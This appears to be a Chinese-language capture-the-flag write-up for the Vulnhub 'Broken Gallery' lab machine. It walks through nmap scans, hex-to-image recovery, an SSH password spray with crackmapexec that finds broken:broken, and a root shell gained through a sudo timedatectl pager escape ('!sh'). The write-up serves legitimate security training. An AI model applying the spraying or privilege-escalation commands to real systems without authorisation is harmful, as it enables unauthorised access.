
## 靶机描述

_这是一台标榜难度为简单的开源靶机。作者说这是一台与众不同的靶机_

![des](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101181556237.png)


## 信息收集

1. 端口扫描

目标开放了 22，80 端口。我们进行进一步的详细信息扫描。

```
# Nmap 7.99 scan initiated Sat Oct 31 16:25:17 2026 as: /usr/lib/nmap/nmap -sT --min-rate 10000 -p- -oA nmapscan/TCPS 192.168.1.16
Nmap scan report for 192.168.1.16
Host is up (0.0010s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:39:DB:BF (VMware)

# Nmap done at Sat Oct 31 16:25:19 2026 -- 1 IP address (1 host up) scanned in 2.07 seconds
```

2. 详细信息扫描

详细信息扫描的结果显示， 网站根目录下面，开放了许多照片。

```
# Nmap 7.99 scan initiated Sat Oct 31 16:26:08 2026 as: /usr/lib/nmap/nmap -sC -sT -O -sV -p22,80 -oA nmapscan/details 192.168.1.16
Nmap scan report for 192.168.1.16
Host is up (0.00071s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 39:5e:bf:8a:49:a3:13:fa:0d:34:b8:db:26:57:79:a7 (RSA)
|   256 20:d7:72:be:30:6a:27:14:e1:e6:c2:16:7a:40:c8:52 (ECDSA)
|_  256 84:a0:9a:59:61:2a:b7:1e:dd:6e:da:3b:91:f9:a0:c6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Index of /
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 55K   2019-08-09 01:20  README.md
| 1.1K  2019-08-09 01:21  gallery.html
| 259K  2019-08-09 01:11  img_5terre.jpg
| 114K  2019-08-09 01:11  img_forest.jpg
| 663K  2019-08-09 01:11  img_lights.jpg
| 8.4K  2019-08-09 01:11  img_mountains.jpg
|_
MAC Address: 00:0C:29:39:DB:BF (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 1 hop
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 31 16:26:16 2026 -- 1 IP address (1 host up) scanned in 8.41 seconds
```

3. 漏洞脚本扫描

为了跟进一步获取攻击面信息，我们采用漏洞脚本扫描来获取立足点。但是，漏洞脚本也没有展示出可以直接利用的信息。

```
# Nmap 7.99 scan initiated Sat Oct 31 16:27:04 2026 as: /usr/lib/nmap/nmap --script=vuln -p22,80 -oA nmapscan/vulns 192.168.1.16
Nmap scan report for 192.168.1.16
Host is up (0.00069s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-sql-injection: ERROR: Script execution failed (use -d to debug)
| http-enum: 
|_  /: Root directory w/ listing on 'apache/2.4.18 (ubuntu)'
MAC Address: 00:0C:29:39:DB:BF (VMware)

# Nmap done at Sat Oct 31 16:32:25 2026 -- 1 IP address (1 host up) scanned in 321.56 seconds
```


## WEB 渗透

首先映入眼帘的是，挂在四张照片的 gallery 界面。我们点击 Mountains 这个按钮，我发现了一个隐藏的网站路径。

![p1](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101190309052.png)
### 隐藏图片获取


![p2](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101190822595.png)

这些 16 进制数据，看上去是一张图片。我们先下载到本地。我们去掉图片中的','还有 “0x” 这些符号，去掉换行和空格符号，这样我获得了一串十六进制字符串，然们将字符串通过管道给 xxd 工具，工具指定 -r -p 参数，先将输入的16 进制数据反向改成二进制，再把输出改成十六进制，此时没有任何 ASCII 字符。

```shell
sed 's/,//g' README.md | sed 's/0x//g' | tr -d ' \n' | xxd -r -p > image.jpg
```

![p3](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101191356381.png)

经过命令处理，最终的 image.jpg 图片如下所示。

![p4](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101192040573.jpg)

这个图片描述了整个系统应用都坏掉了。在 CTF 中，这种大写的字符，或者是用 leetspeak 格式写的字符尤其要关注。

### 手动构建字典

我们将前端收集到的信息存储改成一个字典。

```
5terre
forest
light
mountains
image_tall
img_5terre
img_forest
img_lights
img_mountains
broken
cinqueterre
```

然后使用 crackmapexec 工具进行密码喷洒攻击。

```
crackmapexec ssh 192.168.1.16 -u passes.txt -p passes.txt --continue-on-success
```

![p5](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101192453699.png)

终于我们获得凭据 broken:broken

![p7](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101192620272.png)


## ssh 获得立足点


![p8](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101192721791.png)

登录后，我们发现当前用户可以使用 sudo 权限执行这几条操作。

![p9](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101192836999.png)

这里的 /usr/bin/timedatectl 是个不错的利用点。参考 gtfobins 网站，我们发现其实 timedatectl 工具继承了 less 工具。

![p10](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101193016380.png)

在我们使用 这条命令后，我们进入这个交换界面。

```shell
sudo /usr/bin/timedatectl list-timezones
```

![p11](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101193227847.png)

我们输入

```
!sh
```

![p12](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101193337829.png)

![p13](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101193404709.png)

我们成功拿到 root 权限。

![p14](../vulnhubScreenShot/Vulnhub%20Broken%20gallery%20靶机渗透总结/IMG-20261101193443731.png)



## 总结

这是一台看似简单，其实不简单的靶机。通过端口扫描，我们发现了目标开放了 22，80 端口。但是 80 端口并没有展示出额外多的攻击面。我们通过对图片的处理捕获到关键词 broken。通过搜集网页展示出来的词语信息，我们编写了手工的字典。通过密码喷洒的方式，最终获得了立足点。通过对 broken 用户对 sudo 权限配置不严格，我们成功提权获得 root。